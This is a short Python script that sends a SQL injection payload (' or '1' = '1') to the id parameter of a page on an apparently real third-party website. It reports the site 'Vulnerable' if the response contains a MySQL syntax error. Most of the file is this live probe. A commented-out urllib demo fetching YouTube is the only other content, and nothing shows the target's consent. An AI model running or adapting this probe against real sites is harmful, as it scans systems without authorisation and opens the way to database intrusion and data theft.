import urllib.request
import urllib.parse
'''
# open a connection to a URL using urllib
webUrl  = urllib.request.urlopen('https://www.youtube.com')

#get the result code and print it
print ("result code: " + str(webUrl.getcode()))

# read the data from the URL and print it
data = webUrl.read()
print (data)
'''
#query = urllib.parse.quote(query,safe='/')
target_url = 'http://achromicpoint.com/past-event.php?id=186' 
#request_url = urllib.request.urlopen('https://www.geeksforgeeks.org/') 
#print(request_url.read()) 
resp = urllib.request.urlopen(target_url+ "=1\' or \'1\' = \'1\'")
body = resp.read()
fullbody = body.decode('utf-8')
error = 'You have an error in your SQL syntax'
if error in fullbody:
	print("Vulnerable")
else:
	print("Not Vulnerable")


